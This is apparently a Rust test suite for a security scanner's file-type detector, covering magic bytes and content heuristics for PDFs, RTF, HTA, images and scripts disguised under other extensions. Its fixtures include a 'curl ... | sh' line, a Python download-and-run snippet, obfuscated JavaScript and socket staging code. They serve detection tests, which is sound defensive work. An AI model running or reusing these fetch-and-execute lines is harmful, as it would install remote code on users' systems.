//! Documents, Apple formats, images and media.

use super::*;

// ── Documents ────────────────────────────────────────────────────

#[test]
fn pdf_magic() {
    assert_detect("doc.pdf", b"%PDF-1.4 content", FileType::Pdf);
}

#[test]
fn pdf_by_ext() {
    assert_ext("doc.pdf", FileType::Pdf);
}

#[test]
fn rtf_magic() {
    assert_detect("doc.rtf", b"{\\rtf1\\ansi content", FileType::Rtf);
}

#[test]
fn recognizes_obfuscated_rtf_object_with_malformed_header() {
    let sample = &crate::fileid::testutil::unzstd(include_bytes!(
        "../../../tests/fixtures/rtf/obfuscated-object.sample.zst"
    ));
    assert_detect("document.unknown", sample, FileType::Rtf);
    assert_eq!(
        detect_content(sample).map(|d| (d.file_type, d.source)),
        Some((FileType::Rtf, DetectionSource::Heuristic))
    );
    assert_eq!(
        detect_content(b"{\\rt some text \\object").map(|d| d.file_type),
        None,
        "a lone object marker must not make arbitrary text an RTF document"
    );
}

#[test]
fn ole_doc_magic() {
    let mut data = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
    data.extend_from_slice(&[0; 100]);
    assert_detect("doc.doc", &data, FileType::OleDoc);
}

#[test]
fn ole_by_ext() {
    assert_ext("file.doc", FileType::OleDoc);
    assert_ext("file.xls", FileType::OleDoc);
    assert_ext("file.ppt", FileType::OleDoc);
    assert_ext("file.msg", FileType::OleDoc);
}

#[test]
fn msi_by_ext_and_magic() {
    assert_ext("setup.msi", FileType::Msi);
    assert_ext("patch.msp", FileType::Msi);
    assert_ext("custom.mst", FileType::Msi);
    assert_ext("merge.msm", FileType::Msi);
    let mut data = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
    data.extend_from_slice(&[0; 100]);
    // Extension gates CFBF: installer family → Msi, .doc → OleDoc, bare → OleDoc.
    assert_detect("setup.msi", &data, FileType::Msi);
    assert_detect("patch.msp", &data, FileType::Msi);
    assert_detect("custom.mst", &data, FileType::Msi);
    assert_detect("merge.msm", &data, FileType::Msi);
    assert_detect("doc.doc", &data, FileType::OleDoc);
    assert_detect("untitled.bin", &data, FileType::OleDoc);
}

#[test]
fn ooxml_by_ext_magic() {
    // The Office extension is honoured only when the bytes back it up.
    // Every OOXML document is an OPC package and names
    // `[Content_Types].xml` as its first entry; a zip that only carries
    // the extension is a zip, and is analyzed as one.
    let opc = b"PK\x03\x04[Content_Types].xml".as_slice();
    assert_detect("report.docx", opc, FileType::Ooxml);
    assert_detect("sheet.xlsx", opc, FileType::Ooxml);
    assert_detect("slides.pptx", opc, FileType::Ooxml);
    assert_detect("report.docx", b"PK\x03\x04office", FileType::Zip);
}

#[test]
fn ooxml_by_ext_only() {
    assert_ext("report.docx", FileType::Ooxml);
    assert_ext("report.docm", FileType::Ooxml);
}

// ── Apple formats ────────────────────────────────────────────────

#[test]
fn applescript_magic() {
    assert_detect("script.scpt", b"Fasd\x00\x00", FileType::AppleScript);
}

#[test]
fn applescript_by_ext() {
    assert_ext("script.scpt", FileType::AppleScript);
    assert_ext("script.applescript", FileType::AppleScript);
}

#[test]
fn plist_binary() {
    assert_detect("prefs", b"bplist00\x00\x00\x00", FileType::Plist);
}

#[test]
fn plist_xml() {
    assert_detect(
        "Info.plist",
        b"<?xml version=\"1.0\"?>\n<!DOCTYPE plist>",
        FileType::Plist,
    );
}

#[test]
fn interface_builder_sources_are_xml() {
    let xib = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<document type=\"com.apple.InterfaceBuilder3.Cocoa.XIB\" version=\"3.0\">";
    let det = detect(Path::new("Main.xib"), xib).unwrap();
    assert_eq!(det.file_type, FileType::Xml);
    assert!(!det.extension_mismatch());
    let det = detect(Path::new("Main.storyboard"), xib).unwrap();
    assert_eq!(det.file_type, FileType::Xml);
    assert!(!det.extension_mismatch());
}

#[test]
fn plist_by_ext() {
    assert_ext("prefs.plist", FileType::Plist);
}

// ── Images ───────────────────────────────────────────────────────

#[test]
fn jpeg_magic() {
    assert_detect(
        "photo.jpg",
        &[0xFF, 0xD8, 0xFF, 0xE0, 0, 0x10],
        FileType::Jpeg,
    );
}

#[test]
fn jpeg_by_ext() {
    assert_ext("photo.jpg", FileType::Jpeg);
    assert_ext("photo.jpeg", FileType::Jpeg);
}

#[test]
fn png_magic() {
    assert_detect(
        "image.png",
        b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR",
        FileType::Png,
    );
}

#[test]
fn riff_form_type_selects_wave_webp_and_animated_cursor() {
    let mut wave = b"RIFF".to_vec();
    wave.extend_from_slice(&16u32.to_le_bytes());
    wave.extend_from_slice(b"WAVE");
    assert_detect("clip.wav", &wave, FileType::Wav);
    let mut webp = b"RIFF".to_vec();
    webp.extend_from_slice(&16u32.to_le_bytes());
    webp.extend_from_slice(b"WEBP");
    assert_detect("pic.webp", &webp, FileType::Webp);
    let mut cursor = b"RIFF".to_vec();
    cursor.extend_from_slice(&16u32.to_le_bytes());
    cursor.extend_from_slice(b"ACON");
    let named = detect(Path::new("cursor.ani"), &cursor).unwrap();
    assert_eq!(named.file_type, FileType::Ani);
    assert!(!named.extension_mismatch());
    let renamed = detect(Path::new("cursor.wav"), &cursor).unwrap();
    assert_eq!(renamed.file_type, FileType::Ani);
    assert!(renamed.extension_mismatch());
    assert_eq!(
        detect(Path::new("artifact.bin"), &cursor)
            .unwrap()
            .file_type,
        FileType::Ani
    );
}

#[test]
fn png_by_ext() {
    assert_ext("image.png", FileType::Png);
}

#[test]
fn svg_magic_bare_root() {
    assert_detect(
        "noext",
        b"<svg xmlns=\"http://www.w3.org/2000/svg\">",
        FileType::Svg,
    );
    assert_detect("noext", b"<svg>", FileType::Svg);
}

#[test]
fn svg_magic_with_xml_prolog() {
    // Real-world SVGs frequently lead with an XML prolog (and sometimes a
    // DOCTYPE) before the <svg> root; these must still resolve to Svg, not
    // generic Xml.
    assert_detect(
        "noext",
        b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns=\"x\"></svg>",
        FileType::Svg,
    );
}

#[test]
fn svg_by_ext() {
    assert_detect(
        "logo.svg",
        b"<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>",
        FileType::Svg,
    );
}

#[test]
fn document_names_do_not_hide_javascript() {
    let js = b"const _0x5789f0=_0x14df;(function(_0x27cbc2){\n\
const fs=require('fs');\nfunction loadAsar(){return require('asar');}\n\
function loadBytenode(){return require('bytenode');}\n})();\n";
    for path in [
        "notes.rst",
        "readme.adoc",
        "app.log",
        "rows.csv",
        "rows.tsv",
        "icon.svg",
    ] {
        assert_detect(path, js, FileType::JavaScript);
    }
    assert_detect(
        "notes.rst",
        b"Title\n=====\n\nJust a paragraph.\n",
        FileType::Text,
    );
    assert_detect("rows.csv", b"name,count\nalice,1\n", FileType::Text);
}

#[test]
fn svg_is_image_group() {
    // SVG belongs to the media (image) group so a binary renamed .svg is a
    // binary→image masquerade, even though its content is scanned as XML.
    assert_eq!(FileType::Svg.group().label(), "images");
}

#[test]
fn hta_is_html() {
    // mshta.exe runs an HTML Application as a local-trust program, and the
    // extension went unmapped, so every .hta landed as Unknown -- a type no
    // trait targets, which made this long-standing malware delivery format
    // invisible to rule matching.
    assert_detect(
        "installer.hta",
        b"<html><head><hta:application id=\"a\"/></head><body></body></html>",
        FileType::Html,
    );
}

#[test]
fn front_padded_html_is_still_html() {
    // Observed evasion: an .hta dropper opened with `try {` and ~275 KB of
    // `;` before its first `<html>`, pushing the markup past the old 4 KiB
    // content check. Falling back to Unknown is the worst outcome available
    // -- it matches no trait at all -- so the extension-corroborated check
    // has to see through the padding.
    let mut data = b"try {\n".to_vec();
    data.resize(3 * 1024 * 1024, b';');
    data.extend_from_slice(b"\n<html><head><title>x</title></head></html>\n} catch(e) {}");
    assert_detect("padded.hta", &data, FileType::Html);
}

#[test]
fn html_page_with_inline_svg_is_html() {
    // An icon in the navigation bar does not make the page an image, and
    // typing it as SVG skips every HTML rule.
    assert_detect(
        "panel.html",
        b"<!DOCTYPE html>\n<html lang=\"en\"><body><nav><svg width=\"20\"></svg></nav>",
        FileType::Html,
    );
}

#[test]
fn xhtml_with_inline_svg_is_not_an_image() {
    // An `<?xml` prolog is allowed before an SVG root, so the doctype
    // check alone does not settle XHTML. An `<html>` element ahead of
    // the `<svg>` does: the svg is a child of the page.
    let data = b"<?xml version=\"1.0\"?>\n<html xmlns=\"x\"><body><svg width=\"9\"></svg>";
    let det = detect(Path::new("page.xhtml"), data).expect("a type");
    assert_ne!(det.file_type, FileType::Svg);
}

#[test]
fn svg_doctype_still_detects_svg() {
    assert_detect(
        "noext",
        b"<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"x\">\n<svg xmlns=\"x\"></svg>",
        FileType::Svg,
    );
}

#[test]
fn xml_prolog_without_svg_stays_xml() {
    assert_detect("noext", b"<?xml version=\"1.0\"?>\n<root/>", FileType::Xml);
}

// ── Other formats ────────────────────────────────────────────────

#[test]
fn lnk_magic() {
    let mut data = vec![
        0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x46,
    ];
    data.extend_from_slice(&[0; 100]);
    assert_detect("shortcut.lnk", &data, FileType::Lnk);
}

#[test]
fn lnk_by_ext() {
    assert_ext("shortcut.lnk", FileType::Lnk);
}

#[test]
fn chm_magic() {
    // ITSF header: ITSF + version=3 + header_len + 1 + timestamp + lcid
    let mut data = b"ITSF".to_vec();
    data.extend_from_slice(&3u32.to_le_bytes()); // version
    data.extend_from_slice(&[0u8; 24]); // padding
    assert_detect("help.chm", &data, FileType::Chm);
}

#[test]
fn chm_by_ext() {
    assert_ext("help.chm", FileType::Chm);
}

#[test]
fn pickle_magic() {
    assert_detect("model.pkl", &[0x80, 0x04, 0x95, 0x00], FileType::Pickle);
}

#[test]
fn pickle_by_ext() {
    assert_ext("model.pkl", FileType::Pickle);
    assert_ext("data.pickle", FileType::Pickle);
    assert_ext("page.doctree", FileType::Pickle);

    let data = [0x80, 0x04, 0x95, 0x00, 0, 0, 0, 0, 0, 0, 0, b'.'];
    let detected = FileId::from_path_and_bytes(Path::new("page.doctree"), &data);
    assert_eq!(detected.file_type(), FileType::Pickle);
    assert!(!detected.extension_mismatch());
}

#[test]
fn html_with_content() {
    assert_detect(
        "page.html",
        b"<!DOCTYPE html><html><body>hi</body></html>",
        FileType::Html,
    );
}

#[test]
fn html_without_content_skipped() {
    // .html extension but no HTML tags → skip
    assert!(detect(Path::new("page.html"), b"just plain text").is_none());
}

#[test]
fn extensionless_php_html_fragment_detects_as_php() {
    let data = br#"/**
** Filters for Special Mail Tags
**/

add_filter( 'wpcf7_special_mail_tags', 'wpcf7_special_mail_tag', 10, 3 );

function wpcf7_special_mail_tag( $output, $name, $html ) {
    if ( '_remote_ip' == $name )
        $output = preg_replace( '/[^0-9a-f.:, ]/', '', $_SERVER['REMOTE_ADDR'] );
    elseif ( '_user_agent' == $name )
        $output = substr( $_SERVER['HTTP_USER_AGENT'], 0, 254 );
}
?>
<!DOCTYPE html><html><head><script>var x = 1;</script></head></html>
"#;
    let det = detect(Path::new("wordpress-cache-fragment"), data)
        .expect("expected PHP heuristic detection");
    assert_eq!(det.file_type, FileType::Php);
    assert_eq!(det.source, DetectionSource::Heuristic);
}

#[test]
fn markdown_by_ext() {
    assert_ext("readme.md", FileType::Markdown);
    assert_ext("notes.markdown", FileType::Markdown);
}

#[test]
fn makefile_path_only_detection() {
    assert_detect("Makefile", b"all:\n\techo hi\n", FileType::Makefile);
    assert_detect("Makefile.debug", b"all:\n\techo hi\n", FileType::Makefile);
    assert_detect("rules.mk", b"all:\n\techo hi\n", FileType::Makefile);
    assert_detect("buildfile", b"all:\n\techo hi\n", FileType::Makefile);
    assert!(
        detect(
            Path::new("buildfile"),
            b"This is a note:\n  run make later.\n"
        )
        .is_none(),
        "prose mentioning make should not look like a build file"
    );
}

#[test]
fn tab_indented_python_try_suite_is_not_a_make_recipe() {
    let source = b"import urllib.request\nfrom subprocess import run\ntry:\n\turllib.request.urlretrieve('https://updates.example.org/helper.exe', 'helper.exe')\n\trun(['start', 'helper.exe'], shell=True)\nexcept Exception as error:\n\tprint(error)\n";
    assert_detect("setup.py", source, FileType::Python);
    assert_detect("module.py", source, FileType::Python);
    let make = b"try:\n\tpython -c 'import sys; print(sys.version)'\n";
    assert_detect("Makefile", make, FileType::Makefile);
    assert_detect("recipe.mk", make, FileType::Makefile);
}

#[test]
fn makefile_content_overrides_signatureless_image_extensions() {
    let body = b"JPEG_INC ?= $(shell pkg-config --cflags libjpeg || echo)\nJPEG_LIB ?= $(shell pkg-config --libs libjpeg || echo -ljpeg)\n";
    for path in ["util/makefile.jpeg", "util/makefile.png"] {
        let detected = detect(Path::new(path), body).expect("make syntax is content evidence");
        assert_eq!(detected.file_type, FileType::Makefile, "{path}");
        assert_eq!(detected.source, DetectionSource::Heuristic, "{path}");
        assert!(detected.extension_mismatch(), "{path}");
        assert!(detected.extension_type().is_some(), "{path}");
    }
}

#[test]
fn makefile_content_does_not_override_a_valid_jpeg_signature() {
    let image = b"\xFF\xD8\xFF\xE0JPEG_INC ?= $(shell pkg-config --cflags libjpeg)\n";
    let detected = detect(Path::new("photo.jpeg"), image).expect("JPEG signature");
    assert_eq!(detected.file_type, FileType::Jpeg);
    assert_eq!(detected.source, DetectionSource::Magic);
}

#[test]
fn javascript_comment_and_indented_code_do_not_look_like_makefile() {
    let balala = &crate::fileid::testutil::unzstd(include_bytes!(
        "../../../testdata/vbs/balala-wrapper.sample.zst"
    ));
    let detected = detect(Path::new("payload.sample"), balala)
        .expect("embedded JavaScript wrapper should be identified");
    assert_eq!(detected.file_type, FileType::JavaScript);

    let source = b"function f() {\n\t//post: explanation\n\tcall();\n}\n";
    assert!(
        detect(Path::new("source.unknown"), source)
            .is_none_or(|d| d.file_type != FileType::Makefile)
    );
}

#[test]
fn strong_source_heuristics_override_signatureless_image_extensions() {
    let python = b"import os\nimport subprocess\ndef run():\n    subprocess.call(['tool'])\n";
    for path in ["payload.jpeg", "payload.png"] {
        let detected = detect(Path::new(path), python).expect("Python content");
        assert_eq!(detected.file_type, FileType::Python, "{path}");
        assert_eq!(detected.source, DetectionSource::Heuristic, "{path}");
        assert!(detected.extension_mismatch(), "{path}");
    }
}

// ── TIFF and AVIF ────────────────────────────────────────────────

const TIFF: &[u8] = include_bytes!("../testdata/tiny-tiff.tif");
const AVIF: &[u8] = include_bytes!("../testdata/tiny-avif.avif");

#[test]
fn tiff_and_avif_are_content_identified_under_renamed_paths() {
    for (bytes, ty, name) in [
        (TIFF, FileType::Tiff, "image.tif"),
        (AVIF, FileType::Avif, "image.avif"),
    ] {
        for path in [name, "artifact", "payload.exe"] {
            let id = FileId::from_path_and_bytes(Path::new(path), bytes);
            assert_eq!(id.file_type(), ty, "{path}");
            assert_eq!(id.extension_mismatch(), path == "payload.exe", "{path}");
        }
    }
}

#[test]
fn tiff_header_byte_order_version_and_length_are_required() {
    for bytes in [
        b"II\x2a\0\x08\0\0\0".as_slice(),
        b"MM\0\x2a\0\0\0\x08",
        b"II\x2b\0\x08\0\0\0\x10\0\0\0\0\0\0\0",
        b"MM\0\x2b\0\x08\0\0\0\0\0\0\0\0\0\x10",
    ] {
        assert_eq!(
            detect_content(bytes).map(|d| d.file_type),
            Some(FileType::Tiff)
        );
    }
    for bytes in [
        b"II\x2a\0".as_slice(),
        b"MM\0\x2a\0\0\0",
        b"II\x2c\0\0\0\0\0",
        b"II\x2b\0\x04\0\0\0\0\0\0\0\0\0\0\0",
    ] {
        assert_ne!(
            detect_content(bytes).map(|d| d.file_type),
            Some(FileType::Tiff)
        );
    }
}

#[test]
fn avif_brand_must_be_inside_a_bounded_ftyp_brand_slot() {
    let mut compatible = AVIF.to_vec();
    compatible[8..12].copy_from_slice(b"mif1");
    assert_eq!(
        detect_content(&compatible).map(|d| d.file_type),
        Some(FileType::Avif)
    );
    let mut minor = compatible.clone();
    minor[16..20].copy_from_slice(b"isom");
    minor[12..16].copy_from_slice(b"avif");
    assert_eq!(
        detect_content(&minor).map(|d| d.file_type),
        Some(FileType::Mp4)
    );
    let mut payload = minor.clone();
    payload[12..16].fill(0);
    payload.extend_from_slice(b"avif");
    assert_eq!(
        detect_content(&payload).map(|d| d.file_type),
        Some(FileType::Mp4)
    );
    let mut truncated = AVIF.to_vec();
    truncated[..4].copy_from_slice(&u32::MAX.to_be_bytes());
    assert_ne!(
        detect_content(&truncated).map(|d| d.file_type),
        Some(FileType::Avif)
    );
    let mut extended = Vec::from(1_u32.to_be_bytes());
    extended.extend_from_slice(b"ftyp");
    extended.extend_from_slice(&40_u64.to_be_bytes());
    extended.extend_from_slice(&AVIF[8..]);
    assert_eq!(
        detect_content(&extended).map(|d| d.file_type),
        Some(FileType::Avif)
    );
}

#[test]
fn scripts_under_image_extensions_keep_their_content_type() {
    for path in ["image.tiff", "image.avif"] {
        let id = FileId::from_path_and_bytes(
            Path::new(path),
            b"#!/bin/sh\ncurl https://example.invalid/payload | sh\n",
        );
        assert_eq!(id.file_type(), FileType::Shell);
        assert!(id.extension_mismatch());
    }
}

#[test]
fn tab_indented_python_bare_except_is_not_a_make_target() {
    let source = b"import socket\nfor attempt in range(3):\n\ttry:\n\t\tstream = socket.socket()\n\t\tstream.connect(('localhost', 8080))\n\t\tbreak\n\texcept:\n\t\tpass\n";
    assert_detect("stage.py", source, FileType::Python);
    let valid = b"import socket\ntry:\n\tstream = socket.socket()\nexcept:\n\tpass\n";
    assert_detect("stage.py", valid, FileType::Python);
    assert_detect("stage.pyw", valid, FileType::Python);
    let make = b"except:\n\techo retry\n";
    assert_detect("Makefile", make, FileType::Makefile);
}

#[test]
fn python_namespace_dict_colon_is_not_a_make_target() {
    let source = b"import socket\nfor attempt in range(3):\n\ttry:\n\t\tstream = socket.socket()\n\texcept:\n\t\tpass\nexec(code,{'stream':stream})\n";
    assert_detect("stage.py", source, FileType::Python);
    let source = b"import socket\ntry:\n\tpass\nexcept:\n\tpass\nexec(code,{\"stream\":stream})\n";
    assert_detect("stage.py", source, FileType::Python);
}
